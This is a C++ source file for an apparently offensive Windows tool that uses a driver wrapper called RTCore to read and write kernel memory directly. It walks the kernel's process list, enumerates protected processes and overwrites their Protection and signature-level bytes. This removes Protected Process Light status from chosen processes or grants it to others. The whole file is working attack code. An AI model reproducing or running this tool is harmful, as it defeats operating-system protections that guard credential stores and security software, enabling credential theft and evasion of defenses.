#include "Controller.h"

Controller::Controller()
{
	_rtc = new RTCore();
	_of = new OffsetFinder();

	_of->FindAllOffsets();
}

Controller::Controller(RTCore* rtc, OffsetFinder* of)
{
    _rtc = rtc;
    _of = of;
}

BOOL Controller::ListProtectedProcesses()
{
    PCTRL_PROCESS_INFO pProcessInfo = NULL;
    DWORD dwIndex, dwNumberOfProtectedProceses = 0;

    if (!GetProcessList(&pProcessInfo))
        return FALSE;

    DEBUG(L"Number of process entries: %d", pProcessInfo->NumberOfEntries);

    wprintf(L"\n");

    wprintf(L"   PID  |  Level  |     Signer      |     EXE sig. level    |     DLL sig. level    |    Kernel addr.    \n");
    wprintf(L" -------+---------+-----------------+-----------------------+-----------------------+--------------------\n");

    for (dwIndex = 0; dwIndex < pProcessInfo->NumberOfEntries; dwIndex++)
    {
        if (pProcessInfo->Entries[dwIndex].ProtectionLevel > 0)
        {
            wprintf(L" %6d | %-3ws (%d) | %-11ws (%d) | %-14ws (0x%02x) | %-14ws (0x%02x) | 0x%016llx\n",
                pProcessInfo->Entries[dwIndex].Pid,
                Utils::GetProtectionLevelAsString(pProcessInfo->Entries[dwIndex].ProtectionLevel),
                pProcessInfo->Entries[dwIndex].ProtectionLevel,
                Utils::GetSignerTypeAsString(pProcessInfo->Entries[dwIndex].SignerType),
                pProcessInfo->Entries[dwIndex].SignerType,
                Utils::GetSignatureLevelAsString(pProcessInfo->Entries[dwIndex].SignatureLevel),
                pProcessInfo->Entries[dwIndex].SignatureLevel,
                Utils::GetSignatureLevelAsString(pProcessInfo->Entries[dwIndex].SectionSignatureLevel),
                pProcessInfo->Entries[dwIndex].SectionSignatureLevel,
                pProcessInfo->Entries[dwIndex].KernelAddress
            );

            dwNumberOfProtectedProceses++;
        }
    }

    wprintf(L"\n");

    SUCCESS(L"Enumerated %d protected processes.", dwNumberOfProtectedProceses);

    HeapFree(GetProcessHeap(), 0, pProcessInfo);

    return TRUE;
}

BOOL Controller::GetProcessProtection(DWORD Pid)
{
    ULONG_PTR pProcess;
    UCHAR bProtection;
    UCHAR bProtectionLevel, bSignerType;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;
        
    if (!GetProcessProtection(pProcess, &bProtection))
        return FALSE;

    if (bProtection > 0)
    {
        bProtectionLevel = Utils::GetProtectionLevel(bProtection);
        bSignerType = Utils::GetSignerType(bProtection);

        SUCCESS(L"The process with PID %d is a %ws with the Signer type '%ws' (%d).",
            Pid,
            Utils::GetProtectionLevelAsString(bProtectionLevel),
            Utils::GetSignerTypeAsString(bSignerType),
            bSignerType
        );
    }
    else
    {
        INFO(L"The process with PID %d is not protected.", Pid);
    }

    return TRUE;
}

BOOL Controller::SetProcessProtection(DWORD Pid, LPCWSTR ProtectionLevel, LPCWSTR SignerType)
{
    ULONG_PTR pProcess;
    UCHAR bProtectionOld, bProtectionNew, bProtectionEffective;
    UCHAR bProtectionLevel, bSignerType;

    if (!(bProtectionLevel = Utils::GetProtectionLevelFromString(ProtectionLevel)))
        return FALSE;

    if (!(bSignerType = Utils::GetSignerTypeFromString(SignerType)))
        return FALSE;

    bProtectionNew = Utils::GetProtection(bProtectionLevel, bSignerType);

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessProtection(pProcess, &bProtectionOld))
        return FALSE;

    if (bProtectionOld == bProtectionNew)
    {
        ERROR(L"The process with PID %d already has the protection '%ws-%ws'.",
            Pid,
            Utils::GetProtectionLevelAsString(Utils::GetProtectionLevel(bProtectionOld)),
            Utils::GetSignerTypeAsString(Utils::GetSignerType(bProtectionOld))
        );

        return FALSE;
    }

    if (!SetProcessProtection(pProcess, bProtectionNew))
    {
        ERROR(L"Failed to set Protection '%ws-%ws' on process with PID %d.",
            Utils::GetProtectionLevelAsString(bProtectionLevel),
            Utils::GetSignerTypeAsString(bSignerType),
            Pid
        );

        return FALSE;
    }

    if (!GetProcessProtection(pProcess, &bProtectionEffective))
        return FALSE;

    if (bProtectionNew != bProtectionEffective)
    {
        ERROR(L"Tried to set the protection '%ws-%ws', but the effective protection is: '%ws-%ws'.",
            Utils::GetProtectionLevelAsString(bProtectionLevel),
            Utils::GetSignerTypeAsString(bSignerType),
            Utils::GetProtectionLevelAsString(Utils::GetProtectionLevel(bProtectionEffective)),
            Utils::GetSignerTypeAsString(Utils::GetSignerType(bProtectionEffective))
        );

        return FALSE;
    }

    SUCCESS(L"The Protection '%ws-%ws' was set on the process with PID %d, previous protection was: '%ws-%ws'.",
        Utils::GetProtectionLevelAsString(bProtectionLevel),
        Utils::GetSignerTypeAsString(bSignerType),
        Pid,
        Utils::GetProtectionLevelAsString(Utils::GetProtectionLevel(bProtectionOld)),
        Utils::GetSignerTypeAsString(Utils::GetSignerType(bProtectionOld))
    );

    return TRUE;
}

BOOL Controller::GetProcessSignatureLevels(DWORD Pid)
{
    ULONG_PTR pProcess;
    UCHAR bSignatureLevel, bSectionSignatureLevel;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessSignatureLevel(pProcess, &bSignatureLevel))
        return FALSE;

    if (!GetProcessSectionSignatureLevel(pProcess, &bSectionSignatureLevel))
        return FALSE;

    INFO(L"The process with PID %d has the Signature level '%ws' (0x%02x) and the Section signature level '%ws' (0x%02x).",
        Pid,
        Utils::GetSignatureLevelAsString(bSignatureLevel),
        bSignatureLevel,
        Utils::GetSignatureLevelAsString(bSectionSignatureLevel),
        bSectionSignatureLevel
    );

    return TRUE;
}

BOOL Controller::SetProcessSignatureLevels(DWORD Pid, LPCWSTR SignerType)
{
    ULONG_PTR pProcess;
    UCHAR bSignerType, bSignatureLevel, bSectionSignatureLevel;

    if (!(bSignerType = Utils::GetSignerTypeFromString(SignerType)))
        return FALSE;

    if ((bSignatureLevel = Utils::GetSignatureLevel(bSignerType)) == 0xff)
        return FALSE;

    if ((bSectionSignatureLevel = Utils::GetSectionSignatureLevel(bSignerType)) == 0xff)
        return FALSE;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!SetProcessSignatureLevel(pProcess, bSignatureLevel))
        return FALSE;

    if (!SetProcessSectionSignatureLevel(pProcess, bSectionSignatureLevel))
        return FALSE;

    SUCCESS(L"The Signature level '%ws' and the Section signature level '%ws' were set on the process with PID %d.",
        Utils::GetSignatureLevelAsString(bSignatureLevel),
        Utils::GetSignatureLevelAsString(bSectionSignatureLevel),
        Pid
    );

    return TRUE;
}

BOOL Controller::ProtectProcess(DWORD Pid, LPCWSTR ProtectionLevel, LPCWSTR SignerType)
{
    ULONG_PTR pProcess;
    UCHAR bProtection;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessProtection(pProcess, &bProtection))
        return FALSE;

    if (bProtection > 0)
    {
        ERROR(L"The process with PID %d is already protected, current protection is %ws-%ws.",
            Pid,
            Utils::GetProtectionLevelAsString(Utils::GetProtectionLevel(bProtection)),
            Utils::GetSignerTypeAsString(Utils::GetSignerType(bProtection))
        );

        return FALSE;
    }

    if (!SetProcessProtection(Pid, ProtectionLevel, SignerType))
        return FALSE;

    if (!SetProcessSignatureLevels(Pid, SignerType))
        return FALSE;

    return TRUE;
}

BOOL Controller::UnprotectProcess(DWORD Pid)
{
    ULONG_PTR pProcess;
    UCHAR bProtection;

    if (!GetProcessKernelAddress(Pid, &pProcess))
        return FALSE;

    if (!GetProcessProtection(pProcess, &bProtection))
        return FALSE;

    if (bProtection == 0)
    {
        ERROR(L"The process with PID %d is not protected, nothing to unprotect.", Pid);
        return FALSE;
    }

    if (!SetProcessProtection(pProcess, 0))
    {
        ERROR(L"Failed to set Protection level 'None' and Signer type 'None' on process with PID %d.", Pid);
        return FALSE;
    }

    if (!GetProcessProtection(pProcess, &bProtection))
        return FALSE;

    if (bProtection != 0)
    {
        ERROR(L"The process with PID %d still appears to be protected.", Pid);
        return FALSE;
    }

    if (!SetProcessSignatureLevel(pProcess, SE_SIGNING_LEVEL_UNCHECKED))
    {
        ERROR(L"Failed to set Signature level '%ws' (0x%02x) on process with PID %d.",
            Utils::GetSignatureLevelAsString(SE_SIGNING_LEVEL_UNCHECKED),
            SE_SIGNING_LEVEL_UNCHECKED,
            Pid
        );

        return FALSE;
    }

    if (!SetProcessSectionSignatureLevel(pProcess, SE_SIGNING_LEVEL_UNCHECKED))
    {
        ERROR(L"Failed to set Section signature level '%ws' (0x%02x) on process with PID %d.",
            Utils::GetSignatureLevelAsString(SE_SIGNING_LEVEL_UNCHECKED),
            SE_SIGNING_LEVEL_UNCHECKED,
            Pid
        );

        return FALSE;
    }

    SUCCESS(L"The process with PID %d is no longer a PP(L).", Pid);

    return TRUE;
}

BOOL Controller::GetInitialSystemProcessAddress(PULONG_PTR Addr)
{
    ULONG_PTR pKernelBase, pPsInitialSystemProcess, pInitialSystemProcess;

    *Addr = 0;

    if (!(pKernelBase = Utils::GetKernelBaseAddress()))
        return FALSE;

    if (!(pPsInitialSystemProcess = Utils::GetKernelAddress(pKernelBase, _of->GetOffset(Offset::KernelPsInitialSystemProcess))))
        return FALSE;

    DEBUG(L"%ws @ 0x%016llx\n", OF_STR_PSINITIALSYSTEMPROCESS_SYMBOL_NAME_W, pPsInitialSystemProcess);

    if (!(_rtc->ReadPtr(pPsInitialSystemProcess, &pInitialSystemProcess)))
        return FALSE;

    DEBUG(L"System process @ 0x%016llx\n", pInitialSystemProcess);

    *Addr = pInitialSystemProcess;

    return TRUE;
}

BOOL Controller::GetProcessKernelAddress(DWORD Pid, PULONG_PTR Addr)
{
    PCTRL_PROCESS_INFO pProcessInfo = NULL;
    DWORD dwIndex;
    ULONG_PTR pProcess = 0;

    if (!GetProcessList(&pProcessInfo))
        return FALSE;

    for (dwIndex = 0; dwIndex < pProcessInfo->NumberOfEntries; dwIndex++)
    {
        if (pProcessInfo->Entries[dwIndex].Pid == Pid)
        {
            pProcess = pProcessInfo->Entries[dwIndex].KernelAddress;
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, pProcessInfo);

    if (pProcess == 0)
    {
        ERROR(L"Failed to retrieve Kernel address of process with PID %d.", Pid);
        return FALSE;
    }

    *Addr = pProcess;

    return TRUE;
}

BOOL Controller::GetProcessList(PCTRL_PROCESS_INFO *List)
{
    BOOL bResult = FALSE;
    PCTRL_PROCESS_INFO pProcessList = NULL, pProcessListNew;
    DWORD dwBaseSize = 4096, dwSize, dwNumberOfEntries = 0;
    DWORD64 dwProcessId;
    ULONG_PTR pProcess, pInitialSystemProcess;
    UCHAR bProtection, bSignatureLevel, bSectionSignatureLevel;

    if (!(pProcessList = (PCTRL_PROCESS_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBaseSize)))
        return FALSE;

    dwSize = sizeof(pProcessList->NumberOfEntries);

    if (!GetInitialSystemProcessAddress(&pInitialSystemProcess))
        return FALSE;

    pProcess = pInitialSystemProcess;

    do
    {
        if (!(_rtc->Read64(pProcess + _of->GetOffset(Offset::ProcessUniqueProcessId), &dwProcessId)))
            break;

        DEBUG(L"Process @ 0x%016llx has PID %d\n", pProcess, (DWORD)dwProcessId);

        if (!GetProcessProtection(pProcess, &bProtection))
            break;

        if (!GetProcessSignatureLevel(pProcess, &bSignatureLevel))
            break;

        if (!GetProcessSectionSignatureLevel(pProcess, &bSectionSignatureLevel))
            break;

        dwSize += sizeof((*List)[0]);

        if (dwSize >= dwBaseSize)
        {
            dwBaseSize *= 2;
            if (!(pProcessListNew = (PCTRL_PROCESS_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pProcessList, dwBaseSize)))
                break;

            pProcessList = pProcessListNew;
        }

        pProcessList->Entries[dwNumberOfEntries].KernelAddress = pProcess;
        pProcessList->Entries[dwNumberOfEntries].Pid = (DWORD)dwProcessId;
        pProcessList->Entries[dwNumberOfEntries].ProtectionLevel = Utils::GetProtectionLevel(bProtection);
        pProcessList->Entries[dwNumberOfEntries].SignerType = Utils::GetSignerType(bProtection);
        pProcessList->Entries[dwNumberOfEntries].SignatureLevel = bSignatureLevel;
        pProcessList->Entries[dwNumberOfEntries].SectionSignatureLevel = bSectionSignatureLevel;

        dwNumberOfEntries++;

        if (!(_rtc->ReadPtr(pProcess + _of->GetOffset(Offset::ProcessActiveProcessLinks), &pProcess)))
            break;

        pProcess = pProcess - _of->GetOffset(Offset::ProcessActiveProcessLinks);

    } while (pProcess != pInitialSystemProcess);

    if (pProcess == pInitialSystemProcess)
    {
        pProcessList->NumberOfEntries = dwNumberOfEntries;
        bResult = TRUE;
        *List = pProcessList;
    }

    if (!bResult && pProcessList)
        HeapFree(GetProcessHeap(), 0, pProcessList);

    return bResult;
}

BOOL Controller::GetProcessProtection(ULONG_PTR Addr, PUCHAR Protection)
{
    UCHAR bProtection;

    if (!(_rtc->Read8(Addr + _of->GetOffset(Offset::ProcessProtection), &bProtection)))
    {
#ifdef _WIN64
        ERROR(L"Failed to retrieve Protection attribute of process @ 0x%016llx.", Addr);
#else
        ERROR(L"Failed to retrieve Protection attribute of process @ 0x%08x.", Addr);
#endif
        return FALSE;
    }

    *Protection = bProtection;

    return TRUE;
}

BOOL Controller::SetProcessProtection(ULONG_PTR Addr, UCHAR Protection)
{
    return _rtc->Write8(Addr + _of->GetOffset(Offset::ProcessProtection), Protection);
}

BOOL Controller::GetProcessSignatureLevel(ULONG_PTR Addr, PUCHAR SignatureLevel)
{
    UCHAR bSignatureLevel;

    if (!(_rtc->Read8(Addr + _of->GetOffset(Offset::ProcessSignatureLevel), &bSignatureLevel)))
    {
#ifdef _WIN64
        ERROR(L"Failed to retrieve SignatureLevel attribute of process @ 0x%016llx.", Addr);
#else
        ERROR(L"Failed to retrieve SignatureLevel attribute of process @ 0x%08x.", Addr);
#endif
        return FALSE;
    }

    *SignatureLevel = bSignatureLevel;

    return TRUE;
}

BOOL Controller::SetProcessSignatureLevel(ULONG_PTR Addr, UCHAR SignatureLevel)
{
    return _rtc->Write8(Addr + _of->GetOffset(Offset::ProcessSignatureLevel), SignatureLevel);
}

BOOL Controller::GetProcessSectionSignatureLevel(ULONG_PTR Addr, PUCHAR SectionSignatureLevel)
{
    UCHAR bSectionSignatureLevel;

    if (!(_rtc->Read8(Addr + _of->GetOffset(Offset::ProcessSectionSignatureLevel), &bSectionSignatureLevel)))
    {
#ifdef _WIN64
        ERROR(L"Failed to retrieve SectionSignatureLevel attribute of process @ 0x%016llx.", Addr);
#else
        ERROR(L"Failed to retrieve SectionSignatureLevel attribute of process @ 0x%08x.", Addr);
#endif
        return FALSE;
    }

    *SectionSignatureLevel = bSectionSignatureLevel;

    return TRUE;
}

BOOL Controller::SetProcessSectionSignatureLevel(ULONG_PTR Addr, UCHAR SectionSignatureLevel)
{
    return _rtc->Write8(Addr + _of->GetOffset(Offset::ProcessSectionSignatureLevel), SectionSignatureLevel);
}